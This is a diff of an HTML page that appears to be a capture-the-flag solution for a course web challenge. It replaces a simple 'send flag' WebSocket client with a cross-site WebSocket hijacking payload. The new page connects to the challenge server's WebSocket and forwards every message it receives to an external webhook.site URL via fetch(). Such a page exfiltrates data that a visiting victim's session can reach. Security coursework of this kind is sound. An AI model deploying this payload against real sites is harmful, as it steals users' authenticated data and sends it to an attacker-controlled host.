@@ -3,45 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket Flag Request</title>
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            // WebSocket URL
-            const wsUrl = 'ws://hw2-3-web:8080/admin/ws';
-
-            // Open the WebSocket connection
-            const ws = new WebSocket(wsUrl);
-
-            // When the WebSocket connection opens, send the flag request
-            ws.onopen = () => {
-                console.log('WebSocket connection opened');
-                ws.send('flag'); // Send the 'flag' message to the WebSocket server
-            };
-
-            // When a message is received from the WebSocket, save and log it
-            ws.onmessage = (event) => {
-                const flag = event.data; // The data received from the WebSocket
-                console.log('Received flag:', flag);
-
-                // Save the flag (in this case, just storing it in localStorage for simplicity)
-                localStorage.setItem('flag', flag); // Save to localStorage
-                alert('Flag received and saved: ' + flag); // Alert the user with the flag
-            };
-
-            // Handle WebSocket errors
-            ws.onerror = (error) => {
-                console.error('WebSocket error:', error);
-            };
-
-            // When the WebSocket connection closes
-            ws.onclose = () => {
-                console.log('WebSocket connection closed');
-            };
-        });
-    </script>
+    <title>WebSocket to Webhook</title>
 </head>
 <body>
-    <h1>WebSocket Flag Request</h1>
-    <p>The page will open a WebSocket connection to the server, send the message "flag", and save the response.</p>
+    <h1>WebSocket to Webhook</h1>
+
+    <script>
+        // Initialize the WebSocket connection
+        const socket = new WebSocket('ws://ce441-web.spchallenge.ir:8080/ws');
+
+        // When the socket opens, log it
+        socket.onopen = function(event) {
+            console.log('WebSocket connection established');
+        };
+
+        // Listen for messages from the WebSocket
+        socket.onmessage = function(event) {
+            console.log('Message received from WebSocket: ', event.data);
+
+            // Send the received message to the webhook
+            sendToWebhook(event.data);
+        };
+
+        // Handle socket close
+        socket.onclose = function(event) {
+            console.log('WebSocket connection closed');
+        };
+
+        // Handle socket errors
+        socket.onerror = function(error) {
+            console.log('WebSocket Error: ', error);
+        };
+
+        // Function to send data to the webhook URL
+        function sendToWebhook(data) {
+            fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    message: data
+                })
+            })
+            .then(response => response.json())
+            .then(json => console.log('Data sent to webhook:', json))
+            .catch(error => console.error('Error sending data to webhook:', error));
+        }
+    </script>
 </body>
 </html>
